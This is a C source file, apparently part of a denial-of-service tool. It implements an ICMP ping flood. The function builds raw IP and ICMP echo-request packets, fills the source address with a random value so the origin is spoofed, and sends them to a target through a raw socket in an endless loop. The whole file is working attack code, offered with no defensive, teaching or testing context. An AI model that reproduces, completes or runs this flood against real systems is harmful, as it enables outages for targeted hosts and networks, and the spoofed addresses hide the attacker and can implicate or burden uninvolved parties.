#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "tcp_attack.h"
#include "checksum.h"
#include "types.h"

void attack_icmp_ping(struct target_data *target)
{
	char buffer[BUFFER_SIZE];
	struct ip_hdr *iph = (struct ip_hdr *)buffer;
	struct icmp_hdr *icmph = (struct icmp_hdr *)(buffer + sizeof(struct ip_hdr));

	srand(time(NULL));

	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->length = sizeof(struct ip_hdr) + sizeof(struct icmp_hdr);
	iph->ident = rand() & 0xfff;
	iph->frag = 0;
	iph->ttl = 64;
	iph->protocol = IPPROTO_ICMP;
	iph->checksum = 0;
	iph->src_addr = rand();
	iph->dst_addr = target->target_addr;

	icmph->type = 8;
	icmph->code = 0;
	icmph->checksum = 0;
	icmph->data.data16[0] = rand() & 0xffff;
	icmph->data.data16[1] = rand() & 0xffff;

	target->addr.sin_family = AF_INET;
	target->addr.sin_port = 0;
	target->addr.sin_addr.s_addr = target->target_addr;

	if ((target->sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
		exit(EXIT_FAILURE);
	}

	int enable = 1;
	if (setsockopt(target->sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(int)) == -1) {
		exit(EXIT_FAILURE);
	}

	while (1) {
		iph->ident = rand() & 0xffff;
		iph->src_addr = rand();
		iph->checksum = 0;
		iph->checksum = checksum_generic((uint16_t *)iph, iph->length);

		icmph->data.data16[0] = rand() & 0xffff;
		icmph->data.data16[1] = rand() & 0xffff;
		icmph->checksum = 0;
		icmph->checksum = checksum_generic((uint16_t *)icmph, sizeof(struct icmp_hdr));

		if (sendto(target->sockfd, buffer, iph->length, 0,
				(struct sockaddr *)&target->addr,
				sizeof(struct sockaddr_in)) == -1) {
			exit(EXIT_FAILURE);
                }
	}
}
